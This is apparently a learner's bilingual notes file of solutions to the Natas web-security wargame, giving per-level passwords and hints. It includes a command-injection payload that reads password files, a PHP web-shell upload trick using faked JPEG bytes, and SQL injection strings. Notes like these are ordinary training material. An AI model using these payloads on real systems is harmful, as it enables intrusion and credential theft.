NATAS Q&A

Tutte le pass sono in /etc/natas_webpass/natasXX

LEVEL 3: pass to log in -> sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
		 check file robots.txt(file che contiene le cartelle accessibili dal sito, circa) 
		 si scopre una cartella nascosta in cui c'è il file con la pass


LEVEL 4: login pass: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
		 Pacchetti -> tamper data (più o meno ho capito come funziona)


LEVEL 5: login pass: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
		 cookie -> cookie manager


LEVEL 6: login pass: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
		 Source code, script php, c'è il path di una cartella che porta ad un file txt
         go to the path of the secret.inc and open the inspector, you'll find the secret
		 

LEVEL 7: login pass: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
		 php pages, sostituire il path della password al posto della pagina nella barra degli indirizzi


LEVEL 8: login pass: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
		 input box, source code -> decode di una stringa ( vedi programma python e chiedi a manta come farlo in python)
		 risolto facendo il decode in php MA chiedere comunque come si fa in python 
		 

LEVEL 9: login pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
		 unix injections, sapendo dove sono le pass dei livelli, usando i comandi unix mi faccio dire quella del livello 10
		 ;cat /etc/natas_webpass/natas10
		

LEVEL 10: login pass: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
		  come livello 9 però controlla i caratteri inseriti
		  Find a way to "hide" ; | & 
		  Solved with: ... cat /etc/natas/web_pass/natas11


LEVEL 11: login pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
		  PHP script encrypt the data of a cookie, you need to find the key knowing the in_text and the out_text (XOR) 
		  Change the in_code and encrypt it with the key, copy that string into the cookie and here's the pass!
		  
		  
LEVEL 12: login pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
		  We can upload a file, we create a PHP script for printing the password
		  Using Burp we intercept the request and change the file extension so that we can run it
		  Et voila` we have the password


LEVEL 13: login pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
		  Same as 12, but they check for signature file bytes
		  So we must modify the first 4 bytes of the file and make them as a JPEG file
		  fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>') this python line insert the 4 bytes that we need
		  We intercept again the request and make sure it go back to a PHP script


LEVEL 14: login pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
		  SQL Injection
		  After some test with the request we find some " unchecked so we put [test"OR "1" = "1] in both camp and we log in


LEVEL 15: login pass: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
		  We can check for username in the database, with a python script we brute force the pass char by char


LEVEL 16: login pass: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
		  Brute force again, but this time we brute forse the "grep" parameters, checking for "hello" as answer


LEVEL 17: login pass: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
		  As LEVEL15 but we didnt see the output of the query (it is commented)
		  So again we try to brute force it, using the time respond as an indicator of the right choice of char


LEVEL 18: login pass: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
          We have to login as administrator, there some php functions, we need to figure out what they do and how to crack them
